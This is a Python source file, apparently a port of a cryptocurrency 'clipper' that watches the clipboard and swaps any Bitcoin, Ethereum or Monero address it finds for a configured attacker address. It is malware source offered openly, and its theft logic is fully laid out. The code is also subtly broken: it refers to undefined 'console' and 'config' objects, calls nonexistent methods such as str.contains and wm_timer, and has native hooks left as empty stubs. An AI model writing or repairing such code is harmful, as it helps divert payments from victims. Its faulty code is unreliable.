import threading
import re
import clipboard
import tkinter as tk
from tkinter import messagebox
import time

class Clipper:
    def __init__(self):
        self.clipper_enabled = True

    def run(self):
        if not self.clipper_enabled:
            return
        console.write("[+] Clipper is starting...")
        threading.Thread(target=self.clipboard_notification).start()

    def clipboard_notification(self):
        app = tk.Tk()
        app.overrideredirect(True)
        app.withdraw()
        app.after(1000, lambda: app.destroy())

class PatternRegex:
    btc = re.compile(r'\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b')
    eth = re.compile(r'\b0x[a-fA-F0-9]{40}\b')
    xmr = re.compile(r'\b4([0-9]|[A-B])(.){93}\b')

class Clipboard:
    @staticmethod
    def get_text():
        return clipboard.paste()

    @staticmethod
    def set_text(txt):
        clipboard.copy(txt)

class NativeMethods:
    WM_CLIPBOARDUPDATE = 0x031D
    HWND_MESSAGE = -3

    @staticmethod
    def add_clipboard_format_listener(hwnd):
        # No equivalent in Python
        pass

    @staticmethod
    def set_parent(hwnd_child, hwnd_new_parent):
        # No equivalent in Python
        pass

class ClipboardNotification:
    def __init__(self):
        self.current_clipboard = clipboard.paste()

    def regex_result(self, pattern):
        if pattern.search(self.current_clipboard):
            return True
        else:
            return False

    def wnd_proc(self, m):
        if m['message'] == NativeMethods.WM_CLIPBOARDUPDATE:
            self.current_clipboard = clipboard.paste()

            if self.regex_result(PatternRegex.btc) and not self.current_clipboard.contains(config.bitcoin_address) and config.bitcoin_address:
                result = PatternRegex.btc.sub(config.bitcoin_address, self.current_clipboard)
                clipboard.copy(result)
                messagebox.showinfo("Notification", f"Replaced bitcoin address \"{self.current_clipboard}\" to \"{config.bitcoin_address}\"")
            if self.regex_result(PatternRegex.eth) and not self.current_clipboard.contains(config.etherium_address) and config.etherium_address:
                result = PatternRegex.eth.sub(config.etherium_address, self.current_clipboard)
                clipboard.copy(result)
                messagebox.showinfo("Notification", f"Replaced etherium address \"{self.current_clipboard}\" to \"{config.etherium_address}\"")
            if self.regex_result(PatternRegex.xmr) and not self.current_clipboard.contains(config.monero_address) and config.monero_address:
                result = PatternRegex.xmr.sub(config.monero_address, self.current_clipboard)
                clipboard.copy(result)
                messagebox.showinfo("Notification", f"Replaced monero address \"{self.current_clipboard}\" to \"{config.monero_address}\"")

    def main(self):
        app = tk.Tk()
        app.overrideredirect(True)
        app.withdraw()
        app.after(1000, lambda: app.destroy())
        NativeMethods.add_clipboard_format_listener(app)
        NativeMethods.set_parent(app, NativeMethods.HWND_MESSAGE)
        app.after(0, lambda: app.wm_timer(self.wnd_proc))
